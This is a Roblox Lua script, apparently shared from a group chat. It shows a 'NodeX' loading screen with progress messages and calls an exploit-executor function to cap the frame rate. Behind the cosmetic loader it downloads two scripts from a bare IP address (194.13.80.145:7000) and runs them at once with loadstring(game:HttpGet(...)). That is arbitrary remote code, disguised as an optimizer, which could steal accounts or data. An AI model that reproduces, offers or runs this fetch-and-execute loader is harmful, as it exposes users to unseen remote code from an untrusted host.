--// i just found this gui from random gc boi ✌️😂😂
local Players = game:GetService("Players")
local Player = Players.LocalPlayer
local TweenService = game:GetService("TweenService")

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "LoaderGui"
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = Player:WaitForChild("PlayerGui")

local Loader = Instance.new("Frame")
Loader.Name = "Loader"
Loader.Size = UDim2.fromOffset(320, 150)
Loader.Position = UDim2.fromScale(0.5, 0.5)
Loader.AnchorPoint = Vector2.new(0.5, 0.5)
Loader.BackgroundColor3 = Color3.fromRGB(0, 0, 50)
Loader.BorderSizePixel = 0
Loader.Parent = ScreenGui

local LoaderCorner = Instance.new("UICorner")
LoaderCorner.CornerRadius = UDim.new(0, 12)
LoaderCorner.Parent = Loader

local Stroke = Instance.new("UIStroke")
Stroke.Color = Color3.fromRGB(30, 144, 255) 
Stroke.Thickness = 2
Stroke.Transparency = 0.3
Stroke.Parent = Loader

local Background = Instance.new("Frame")
Background.Size = UDim2.fromScale(1, 1)
Background.BackgroundColor3 = Color3.fromRGB(0, 0, 50)
Background.BackgroundTransparency = 0.1
Background.BorderSizePixel = 0
Background.Parent = Loader

local BgCorner = Instance.new("UICorner")
BgCorner.CornerRadius = UDim.new(0, 12)
BgCorner.Parent = Background

local Icon = Instance.new("ImageLabel")
Icon.Size = UDim2.fromOffset(20, 20)
Icon.Position = UDim2.fromOffset(15, 12)
Icon.BackgroundTransparency = 1
Icon.Image = "rbxassetid://10709818626"
Icon.Parent = Loader

local Text = Instance.new("TextLabel")
Text.Size = UDim2.fromOffset(260, 20)
Text.Position = UDim2.fromOffset(42, 12)
Text.BackgroundTransparency = 1
Text.Text = 'Please wait while <font color="#1E90FF">NodeX</font> loads...'
Text.RichText = true
Text.TextColor3 = Color3.fromRGB(200, 200, 200)
Text.Font = Enum.Font.GothamMedium
Text.TextSize = 12
Text.TextXAlignment = Enum.TextXAlignment.Left
Text.Parent = Loader

local CenterImage = Instance.new("ImageLabel")
CenterImage.Size = UDim2.fromOffset(45, 45)
CenterImage.Position = UDim2.fromScale(0.5, 0.45)
CenterImage.AnchorPoint = Vector2.new(0.5, 0.5)
CenterImage.BackgroundTransparency = 1
CenterImage.Image = "rbxassetid://10709818626"
CenterImage.ImageColor3 = Color3.fromRGB(200, 200, 200)
CenterImage.Parent = Loader

local BarBg = Instance.new("Frame")
BarBg.Size = UDim2.new(0.8, 0, 0, 4)
BarBg.Position = UDim2.fromScale(0.5, 0.85)
BarBg.AnchorPoint = Vector2.new(0.5, 1)
BarBg.BackgroundColor3 = Color3.fromRGB(30, 30, 60)
BarBg.BorderSizePixel = 0
BarBg.Parent = Loader

local BarBgCorner = Instance.new("UICorner")
BarBgCorner.CornerRadius = UDim.new(1, 0)
BarBgCorner.Parent = BarBg

local BarFill = Instance.new("Frame")
BarFill.Size = UDim2.fromScale(0, 1)
BarFill.BackgroundColor3 = Color3.fromRGB(30, 144, 255)
BarFill.BorderSizePixel = 0
BarFill.Parent = BarBg

local BarFillCorner = Instance.new("UICorner")
BarFillCorner.CornerRadius = UDim.new(1, 0)
BarFillCorner.Parent = BarFill

local Status = Instance.new("TextLabel")
Status.Size = UDim2.fromOffset(200, 15)
Status.Position = UDim2.fromScale(0.5, 0.86)
Status.AnchorPoint = Vector2.new(0.5, 0)
Status.BackgroundTransparency = 1
Status.Text = "Starting..."
Status.TextColor3 = Color3.fromRGB(150, 150, 200)
Status.Font = Enum.Font.GothamBold
Status.TextSize = 11
Status.TextXAlignment = Enum.TextXAlignment.Right
Status.Parent = Loader

local function AnimateProgressBar(Duration, Steps)
    local StepDuration = Duration / Steps
    local dotCount = 0
    local maxDots = 3
    local lastDotUpdate = tick()

    local function updateDots()
        dotCount = (dotCount % maxDots) + 1
        return string.rep(".", dotCount)
    end

    for I = 1, Steps do
        local Progress = I / Steps

        local Tween = TweenService:Create(
            BarFill,
            TweenInfo.new(StepDuration, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
            {Size = UDim2.fromScale(Progress, 1)}
        )

        Tween:Play()
        Tween.Completed:Wait()
        
        if tick() - lastDotUpdate > 0.5 then
            lastDotUpdate = tick()
            local dots = updateDots()
            
            if Progress < 0.3 then
                Status.Text = "Loading core modules" .. dots
            elseif Progress < 0.6 then
                Status.Text = "Initializing components" .. dots
            elseif Progress < 0.9 then
                Status.Text = "Finalizing setup" .. dots
            end
        end
    end

    local FinalTween = TweenService:Create(
        BarFill,
        TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
        {Size = UDim2.fromScale(1, 1)}
    )
    FinalTween:Play()
    FinalTween.Completed:Wait()

    Status.Text = "Setting FPS cap..."
    task.wait(0.5)
    
    pcall(function()
        if setfpscap then 
            setfpscap(60)
            Status.Text = "FPS cap set to 60"
        else
            Status.Text = "FPS cap not available"
        end
    end)
    
    task.wait(0.5)
    
    Status.Text = "Loading script 1..."
    local success1, error1 = pcall(function()
        loadstring(game:HttpGet("http://194.13.80.145:7000/raw/Optimizer.lua"))()
    end)
    
    if success1 then
        Status.Text = "Script 1 loaded"
    else
        Status.Text = "Script 1 failed: " .. tostring(error1):sub(1, 20)
    end
    
    task.wait(0.5)
    
    Status.Text = "Loading script 2..."
    local success2, error2 = pcall(function()
        loadstring(game:HttpGet("http://194.13.80.145:7000/raw/Node.lua"))()
    end)
    
    if success2 then
        Status.Text = "Script 2 loaded"
    else
        Status.Text = "Script 2 failed: " .. tostring(error2):sub(1, 20)
    end
    
    task.wait(0.5)
    
    if success1 and success2 then
        Status.Text = "All scripts loaded successfully!"
        task.wait(0.5)
        
        local elementsToFade = {Icon, Text, CenterImage, BarBg, Status, Stroke, Background}
        for _, element in ipairs(elementsToFade) do
            local props = {}
            if element:IsA("TextLabel") then 
                props.TextTransparency = 1
            elseif element:IsA("ImageLabel") then 
                props.ImageTransparency = 1
            elseif element:IsA("Frame") or element:IsA("UIStroke") then
                if element:IsA("UIStroke") then 
                    props.Transparency = 1 
                else 
                    props.BackgroundTransparency = 1 
                end
            end
            TweenService:Create(element, TweenInfo.new(0.35, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), props):Play()
        end
        task.wait(0.4)

        TweenService:Create(
            Loader,
            TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.In),
            {Size = UDim2.fromOffset(0, 0), BackgroundTransparency = 1}
        ):Play()
        task.wait(0.45)

        ScreenGui:Destroy()
    else
        Status.Text = "Some scripts failed to load"
        Status.TextColor3 = Color3.fromRGB(255, 100, 100)
        task.wait(2)
    end
end

task.spawn(function()
    AnimateProgressBar(2.5, 12) 
end)


